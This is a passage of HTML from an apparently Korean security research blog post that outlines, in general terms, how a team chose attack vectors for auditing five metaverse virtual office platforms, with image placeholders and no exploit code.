4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability analysis methodology</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB20lEQVQY0yVRTUiTAQB9rs2tqEuEQXTpoLkujYrWyQ5JZB06RHUKB3WIMDEoFEOpgQXVQYoKUuwSFkIaHmIyhqFNWq1SXM65fV/LbLbNqd83P933txefHd7h/VzeewAEhOaJt9E8XIDDZncdddgdXgAeAG4AB2x2V11lpesIgP0AaizP7nDWO7fuqD3f9gJTEvEkvAGJrADAiqEZvXF4Rr2KkxHX2ZcESfRNrJwbni621rUH9/gz/7XnE8rxYFLtuDnwq9biIon7Y6Y7mNRuPxqVvcIagUBMuVsoalxVNAZich/Abb0h7VpW0qiUdEZEJQQ3q/xvtIZYeknN5guMzC2lTj80qi900ZP4q/7eUHWKeVXpHMp58D1VHE//THJeiDOckKUan/m0Z1AVF/8IFBMxJhZW9EPNen9XL8cFYZbRT2NaXFzgpcdmv+8Og4vZZc7FJ9V8vsDX4dIVDIyWL2ZyRilX0MuDH0rNkwLR8758LJ0xs8uSwVBU67bq+V+Ze3+IRkxeMxieKr0DmrbglO78NmsE5KLB6ZT55UxLogo5mWhsXd93uV3a3MXC1xRxwifvvu4vHrQ40I2Rz8Qu7+r2G/fWDwO3bE0PJDwb4eYHvpaP9c6dDdVW9h/27COPllP6xQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"vuln-analysis-method.png\"\n        title=\"vuln-analysis-method.png\"\n        src=\"/static/b78fc8f9c8f823b0835cc54e095aaf1b/37523/vuln-analysis-method.png\"\n        srcset=\"/static/b78fc8f9c8f823b0835cc54e095aaf1b/e9ff0/vuln-analysis-method.png 180w,\n/static/b78fc8f9c8f823b0835cc54e095aaf1b/f21e7/vuln-analysis-method.png 360w,\n/static/b78fc8f9c8f823b0835cc54e095aaf1b/37523/vuln-analysis-method.png 720w,\n/static/b78fc8f9c8f823b0835cc54e095aaf1b/302a4/vuln-analysis-method.png 1080w,\n/static/b78fc8f9c8f823b0835cc54e095aaf1b/07a9c/vuln-analysis-method.png 1440w,\n/static/b78fc8f9c8f823b0835cc54e095aaf1b/1f6b7/vuln-analysis-method.png 1909w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>우리는 취약점 분석 방법론을 구축하여 대상 애플리케이션에 대한 취약점을 분석하였습니다.</p>\n<ol>\n<li>Function analysis by target</li>\n<li>Technology stack analysis</li>\n<li>Architecture and attack vector configuration</li>\n<li>Attack Vector Selection</li>\n</ol>\n<p>4가지 순서대로 취약점 점검을 진행하는 대상 애플리케이션에 대한 기능을 분석하여 열거를 하였습니다. 분석 대상마다 서로 다른 기능이 존재 하지만 공통적인 기능이 존재하여 이를 분류하는 작업과 취약한 부분이 있을 경우 매칭하여 리스트를 만들었습니다.</p>\n<p>웹/바이너리 애플리케이션 환경에서 분석한 데이터를 기반으로 기술 스택 리스트를 만들어 기능 리스트와 매칭하여 각 플랫폼 마다 아키텍처를 구성하였습니다. 구성된 아키텍처에서 취약한 공격 벡터를 구성하여 최종적인 공격 벡터를 선정하였습니다.</p>\n<h2 id=\"common-functions-for-each-metaverse-virtual-office-platform\" style=\"position:relative;\"><a href=\"#common-functions-for-each-metaverse-virtual-office-platform\" aria-label=\"common functions for each metaverse virtual office platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Common functions for each MetaVerse Virtual office platform</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACvElEQVQoz02S3W8UVRjG9//AxAvuSASlBAoU2mgMGi5MTDAE0GDSCqIGUVJJWluBxP/ACBckXHhVYwnBC0OyUqHFQqW7s2V3u9873+xHuzv7MbNndmZ+ZGch8e7Nec75ned53zcCUK1rJNMxcsXnFEop0hmJfClJoZwik0+QySXYSK2RyUmU1c1QS2djbGbjoR69v0JSKtNteUSKSUF6zSGz7iAt2zxftYf1I5vEsv3qzOHZgy7rS13iD22ePbCJ/TPUlu9ZzJ1O8fNUhutnU0R++Mhg8oDC1KjKiZ1lPtsj8/Bum6XFFokVm+jvLf77u8vKnx2iC8M6utAMP1habBNdsPjy0Drfjq9xcXydyPwpk+8+0Ln4vs7ZvQrnx1RquktzSwy6Qd0UBPgEgY+15QIBVrMdata2S8dyuTwR59Lov0y/F38F/FDn8nGdLw6qnDukImcEpbQTPs4nbDpWn2a9j5xxcIVPfsPG6weYWouKajM9FmfmyCpXjsaJzH5i8NWExoWjGlMHVM4fVtEKgpohQqAp97A7fTqWR0UTIVAvCjzPp6q51HTBldE40+88YWZMIvLTmaHDAXRyv8K5wypKViBnnTBWYcMJp9e2BEa5g+97GFqdIAgwlA5VzWFmn8T8vlVm90tE5k6afPOuxtcTGp/ulsPIA4cvlF4IrJoWPcel23apvejSd31MpY3vB9QrXbYMh9k9ErO7njA/Ig17eOmYzvfHdSZfR84P3AwdVkKgoNXwMEq9EKhke/i+j1EWVBXB1bclrr31lOsjicHa6FwYH8Y9tUvm8xEFeVOg/D9y26PV6KPmHby+TzFph/1V8z0q5R4zb8SY2/GYH9+MEfnrtyZ//LLNnRsNFn9tcOdmI7yolxys7SFksDqDIemlHttVF63g0Ki5mLLALApufZzjxrEkt0/meAmKhd0dcrKZIQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"common-functions.png\"\n        title=\"common-functions.png\"\n        src=\"/static/a1c00b871841925ed8481d11635ffb9f/37523/common-functions.png\"\n        srcset=\"/static/a1c00b871841925ed8481d11635ffb9f/e9ff0/common-functions.png 180w,\n/static/a1c00b871841925ed8481d11635ffb9f/f21e7/common-functions.png 360w,\n/static/a1c00b871841925ed8481d11635ffb9f/37523/common-functions.png 720w,\n/static/a1c00b871841925ed8481d11635ffb9f/302a4/common-functions.png 1080w,\n/static/a1c00b871841925ed8481d11635ffb9f/07a9c/common-functions.png 1440w,\n/static/a1c00b871841925ed8481d11635ffb9f/c6720/common-functions.png 1922w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>리스트는 선정한 5가지의 메타버스 기반 가상 오피스 플랫폼별 기능 중 팀에서 연구를 통해 수많은 기능 중 공통된 13가지의 기능 리스트입니다. 세부적으로 가상 오피스 내부 공간을 space라 칭하며space 출근/퇴근 기능, 회의실 출근/퇴근, space에 초대하는 기능, Space/Room 내부에 다양한 Object를 생성/삭제/수정, 내부 콘텐츠를 공유, 채팅 (음성, 영상, 글), 접근 통제, Space 생성/삭제/수정, 사용자 권한, 외부 문서 공유 기능으로 나누었습니다. 산출된 공통 기능들 중 플랫폼별 체크리스트 형태로 정리를 하였습니다.</p>\n<h2 id=\"technology-stacks-to-metaverse-virtual-office-platform-enumeration\" style=\"position:relative;\"><a href=\"#technology-stacks-to-metaverse-virtual-office-platform-enumeration\" aria-label=\"technology stacks to metaverse virtual office platform enumeration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Technology Stacks to MetaVerse Virtual office platform Enumeration</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACt0lEQVQoz22Sy28bdRSF/R+yZsG2CyTaAoKWRiJFVFYStWkpbVrykEsfC0QQ4pUQIZEipY6TOI09Nnn4OZ7x2DOe+XnGnrHn4fF8VRKJFWdz7zm6m/PppsqHPb6/W2N9pcbzxSqr82W+SxdZTktk7hdZmS+wdFtibUHi8e0jMoslnj0o8+1snpW5Eo++klieL3Lvi0POSj1SpQODD95Lc+PqQ668n+belzmuX8mx+viIyp91Chsq+9suu5sD/lhxOc3aVLKCci6k+HpIecugtmMhbVkYakiq1TB5+M0Sa6sZlp48Ird9Rv2tz4QIv60yGdhAjDcc4zkxrjBwdBVIgBDGJnTqEA8ZOgGpZrXH/bvLzKUXWZh7wD9bZboyeLKGVW2xfyAhNxREN6BR8GnJOrWawsiLcc0hQaWGX2/iNxRsyydVP9P56MPPuXVzlmtXP2V7Q6J9GhO4I+yGijBtfD9E6D6N4hhN1ZGbCmMvYuQGhEqLcT5PKPo4IiClNPo8W13n5/VNXr1YZ2+7wVF2SLtlopbqaCdtOppNuzmgeuihdwR6x2Lo+HhuSBQGBEIQTWJs4Z9XNpm5eYc7Xy8wc2uWjd/2eZUp8OLpLxxky/z0Q57nL//mbUEm8sB2bISwONckSph2NCYnJyTOgIETkTK0ETuvJfJ7x+TeSBxLBuZeldHOG2zdwlPahJ0Oth1itHycvktfDC4qj72ASbdDWK8TmhZOPyB1UlL55NrMBcOPr3/Gjy+zZNb+Ra4oOOUKoqbiiCF626N9FqJ3TVRFYxJOGY8iJrbNRFVJwuiSoaG5bP66y1+bObZ+36VcUOl2bXrGEOO0Ra8tMK0RXc3BsUdoioUq9xDGCEt3cVQT/VSmeSxj9TxS/I+SJCGZTi8+bZokTM/38xlP/7u5zC69H0WIfp84jnkHbfsFvpfPNUcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"tech-stack.png\"\n        title=\"tech-stack.png\"\n        src=\"/static/0f308b4b617d8f4954a786c0026a0ad5/37523/tech-stack.png\"\n        srcset=\"/static/0f308b4b617d8f4954a786c0026a0ad5/e9ff0/tech-stack.png 180w,\n/static/0f308b4b617d8f4954a786c0026a0ad5/f21e7/tech-stack.png 360w,\n/static/0f308b4b617d8f4954a786c0026a0ad5/37523/tech-stack.png 720w,\n/static/0f308b4b617d8f4954a786c0026a0ad5/302a4/tech-stack.png 1080w,\n/static/0f308b4b617d8f4954a786c0026a0ad5/07a9c/tech-stack.png 1440w,\n/static/0f308b4b617d8f4954a786c0026a0ad5/29114/tech-stack.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>앞서 13가지 공통 기능과 함께 아키텍처를 구성하기 위해 기술 스택 분석을 진행하였습니다. 해당 리스트는 선정한 5가지의 메타버스 기반 가상오피스 플랫폼 별 기술 스택을 정리하였습니다. 각 플랫폼 마다 바이너리/웹 애플리케이션 환경에서 사용되는 중요 기술에 대해 구분을 지었으며 공통적으로 핵심 기술 스택 부분인 front-end, back-end, ipc 카테고리로 분류하였습니다.</p>\n<p>13가지 기능과 기술 스택을 매칭하여 가중치가 높게 나온 기술 부분에 대해 중점적인 취약점 분석을 진행하였습니다.</p>\n<h2 id=\"architecture-and-attack-vectors-by-platform\" style=\"position:relative;\"><a href=\"#architecture-and-attack-vectors-by-platform\" aria-label=\"architecture and attack vectors by platform permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Architecture and attack vectors by platform</h2>\n<p>아키텍처 및 공격 벡터 선정에 있어 앞서 메타버스 기반 가상 오피스 플랫폼 별 기술 스택과 공통 기능 리스트를 분석을 통해 산출된 데이터를 기반으로 구성을 진행하였습니다.</p>\n<ul>\n<li>kumospace (web)</li>\n<li>oVice (web)</li>\n<li>Gather (web/PC binary)</li>\n<li>Spatial (web/mobile/PC VR)</li>\n<li>Horizon workrooms (web/mobile/VR)</li>\n</ul>\n<p>선정한 5가지 플랫폼에 대한 아키텍처를 구성한 후 공통 기능 13가지 부분에 대해서는 hotspot point를 잡았고 나머지 Unique 한 기능에 대해서는 cold Spot point로 잡아 최종적인 공격 벡터를 선정하였습니다.</p>\n<p>선정된 공격 벡터는 IPC 개념에서의 Web Socket 통신을 활용해 Avatar, Map, Theme 등 실시간으로 적용되는 콘텐츠와 Voice, Screen Sharing을 위한 WEB RTC 통신 과정에 대해 Hooking과 클라이언트 처리 과정에 대해서 Code Auditing을 진행하였습니다.</p>\n<p>Origin-API, Third-Party API 개념의 공격 벡터는 각 웹/바이너리 환경에서 특정 네트워크 처리를 진행하는 부분과 base Language에 관련된 모듈을 Code Auditing과 Application Request/Response 과정을 분석하였습니다.</p>\n<p>oculus VR 장비의 Application으로 Android APK의 전반적인 공격 벡터로 Code Auditing과 관련 모듈에 대해 JNI, Third-party lb에 대해서 Hooking을 통해 흐름 분석을 진행하였습니다.</p>\n<p>각 플랫폼별 내부 콘텐츠/오브젝트에 관해 구현된 언어와 기능적 부분을 공격 벡터로 선정하여 로직 버그 및 보호 대책 미흡 부분을 우회하는 방안으로 분석을 진행하였습니다.</p>\n<h3 id=\"kumospace\" style=\"position:relative;\"><a href=\"#kumospace\" aria-label=\"kumospace permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Kumospace</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACjElEQVQoz1XTy08TURTA4cbErSvFFX+KIcaFiWFlWLkwMTEa48qdJmgU38bEGA0GNT5QAXkUQVAotWCtFCgU7dCOaSl98Sh9DHSgddqZuT/TAUFPcpJ7b3K/e3JOrg0hsEIIhDCAaprbKVjLZ4iGZcIhCSWb3joXJhjV1BGmwb+GzdpUMQSkw+g/RtEmHGiBXsiOMt3/lrq6Bg7XHUce6IYpB2XfAHqiDzPwBRIRxLaxAwpzG4zMUI6Mo8x0sRQYoxjpIDbn5WbTdZouX2FlXoZcispiBF2JYi5FENKkBf5FbeJvudWIS5jrSYqZH6gxF1ouCmg8aunkQ5/DagGaCuVN0HVYz0MksHNdWBUClbJGYdnLhqcVtb+V3LSbNSVGMpEiHo9xpP48p881kllJs5hKUljLoiR9qJKdjd6nFNzDVDTNQi1wdSWDLzDNlOTH4/yG3/WRQdcYE1KcqeAvDh07y4kzFwkmlnH7g4x6J/kVDTMhTfJ9fJqvPe0k54O74OKCH4+rk5EvHnrs/dx+cx+vHKD6phSN8LLtHa2dHaSUVVQM5lNh5qbsDDnGcDrdXG2+y7DPuQuGQm6e9p3m+eA97rxr4tqzRkLxWLVj6LsdttYVIJmN8955iZZPjTzufkBj8wW+Tbh2wXRRZWDBz61ZJ/c9PoLyPOFsmievX/Oqo5233V202XtoefmCrpHPLG/kcPwc46E0xA2fD28ibQ2sWsB/U06USuRUhd+Kwmwyzr4D+6nZs5f6mlqOHqzFZrPRcOok6/ompcwKiaJC3tzENCoUCgV0Xd+qsIoapknZEBQNgWoK678sZTJIc3PIskwgGCQgh1BLRcqAKnQ0o0JZGBRLJfL5PIZh8Af9JAQ5AkKmtAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"21 – 1.png\"\n        title=\"21 – 1.png\"\n        src=\"/static/64b8477123f0830e2dc6b1bb47f5a150/37523/21__1.png\"\n        srcset=\"/static/64b8477123f0830e2dc6b1bb47f5a150/e9ff0/21__1.png 180w,\n/static/64b8477123f0830e2dc6b1bb47f5a150/f21e7/21__1.png 360w,\n/static/64b8477123f0830e2dc6b1bb47f5a150/37523/21__1.png 720w,\n/static/64b8477123f0830e2dc6b1bb47f5a150/302a4/21__1.png 1080w,\n/static/64b8477123f0830e2dc6b1bb47f5a150/07a9c/21__1.png 1440w,\n/static/64b8477123f0830e2dc6b1bb47f5a150/29114/21__1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"ovice\" style=\"position:relative;\"><a href=\"#ovice\" aria-label=\"ovice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>oVice</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAClUlEQVQoz1WTa08TQRSG/Uca4x/xoxoTo4nxC/ESbzECKgRIECIioIiCVEDl1iACJVwMUiorha7FLt22btkWC922tmq3wO72MVtB8U3emTnJnCdvcmYOFYtFbNm7aRpYlmlXewZd3yYYVJCkMPl8gf37tgzTwjQtDjIO2Ytd26CZOYGmtlfcb+6hrr6FtrZWKu+2c/TYSQ4fOc6dqifUt7yh/qGD6uoaGh91894tUiz+gf4FWnY6Y4fXQ5M4R2fp7B6i780wva8GmZ8XuHylnLKyGywKPvyBCO5FkUXBy8KiSO/gdCmlZR0A7mvU5SYoR4iEwyzMziH6/CQSCbLZLNlsjs0tjaSWRtMy7BgWsW8Z3ro8f/tLQPtQ0AtUVpRz4swlTp2vorljgGh8g0DkK2oyhZrUWN/aIqZpyGqMeOY7nY6XnDx9jtMX7nHz7lN+/syXoCVgQA7T0NlFj3OE+45hBvv7CKxHSe0aLHwW8fj9CGsRPAGZ1K6OFFPpGxvn4bPndDhd1DW1EvR7/wHfiQGeuSbxjPfR3tJPg3MQIbRKPJ3l6vVb1NQ2UF7dyrXbjcTTSVaiCq0fPMxPOel/4aD68QDDHycOAH0iF0cGqHB0cP7xANeHXEhxlbVwFHF5lczGJnoyTUZRkWQZaXOD8qlJKoZecrW9m7NdY0wsffoHjP/QGA0JPFiZp3kpxEo0wQ/TZFrw4upxIkzOkA4pKF4/bq+XlKEzoSzTHXRTu+RjTtmEveH+N+UZLcqyFicUTbCmrrOiqnhXZb7IIfxrMj5JQowpSGocRVVZSH1FyifAMsjlchiG8Sfh/qNMbesk9TyFXYOCaWL/GQPY3bNRcpGCZaAbO2zpOX6ZO+h6gXQ6jWma/Ab/q/t7U/e3GgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"28 – 1.png\"\n        title=\"28 – 1.png\"\n        src=\"/static/9023e97fb499398a9bf926f68326a23b/37523/28__1.png\"\n        srcset=\"/static/9023e97fb499398a9bf926f68326a23b/e9ff0/28__1.png 180w,\n/static/9023e97fb499398a9bf926f68326a23b/f21e7/28__1.png 360w,\n/static/9023e97fb499398a9bf926f68326a23b/37523/28__1.png 720w,\n/static/9023e97fb499398a9bf926f68326a23b/302a4/28__1.png 1080w,\n/static/9023e97fb499398a9bf926f68326a23b/07a9c/28__1.png 1440w,\n/static/9023e97fb499398a9bf926f68326a23b/29114/28__1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"gather\" style=\"position:relative;\"><a href=\"#gather\" aria-label=\"gather permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gather</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACpklEQVQoz02Ty09TQRSHCQsTd/4Prly4wRijhrVL3bjQRGOiUVcmYGQhGlEDJCIIFQSj+ADKq5UCsRahlIK8Wh4t7S2FvngFLYVKW9tie+/tZ26LgV9yZk5mku/8cs5MXiaTQZGyi2IGSQRZBknKIMsZ9hJp3K4AbpefZDyFrJxnQySdEhHTEocZecqSC3BYNtC+G6W19htdjTPo29apeaaj4NQVCk5d5s0LDR2qAdR1Rtpfe/jSPIl9apkDxj5QViwBw70OJgfd6LsmqK/oYlS/xoTZRenDSh7cL8M+68EnbCLM+Fmyh3BaVxjUTpNjHAJCzvLk4BIbgV0sJjdttUO4ZoKk/kBVfTfqLiOIEA0niIaTpPdS/FoPMW5Y4L+yQCX5u5fCrF+ntlRPdUkrPS1jbPyM4RCC2BwrFF64xdUbJXg8WwjuTTaD24wZ/bTUTFNx7wOdjQYS8b0sNAv0egJ0Giz0DVspf/wIXWc7/UMmJux+fFvbXLx2l+LH5QRCEcxzLgbMZoxTTnpGnNSrGqh+9pQV7/IBsFtjQNfxmRW7Ad2bMlRtz/nhtJEAQsk4VpeDBd8yO6k4CURMljneNzWzKhgZUdfxUlXM4PTAAbDho4aiotuM971C/baG1sZKnMs+lFEl9zus5In9XlmFJa7fvMOErppPTVU0q8oYNX0/AO78jfE1ME/5nIniUQv9Xh8L4Z+oe3WotRratRratN2ov2ho7+thNrxG09IIT2b6qbDamVrdyQ1FAf5/lIpWE3Gc0S2E2Da230HOFBaSn5/H8YITnDx3iSNHj3H6/Flsu5ssxkMIsV9E5DiSlCIajSKKYs5h9pfIMmkpgyiBKOWK7EQi2AQnTp+XRa+feccC25Hd7J0oSYiyREqWSCSThMNhJEniHwX275WDyQQLAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"38 – 1.png\"\n        title=\"38 – 1.png\"\n        src=\"/static/62973378c4f9873a4c5fe3be44d1f56a/37523/38__1.png\"\n        srcset=\"/static/62973378c4f9873a4c5fe3be44d1f56a/e9ff0/38__1.png 180w,\n/static/62973378c4f9873a4c5fe3be44d1f56a/f21e7/38__1.png 360w,\n/static/62973378c4f9873a4c5fe3be44d1f56a/37523/38__1.png 720w,\n/static/62973378c4f9873a4c5fe3be44d1f56a/302a4/38__1.png 1080w,\n/static/62973378c4f9873a4c5fe3be44d1f56a/07a9c/38__1.png 1440w,\n/static/62973378c4f9873a4c5fe3be44d1f56a/29114/38__1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"spatial\" style=\"position:relative;\"><a href=\"#spatial\" aria-label=\"spatial permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Spatial</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: 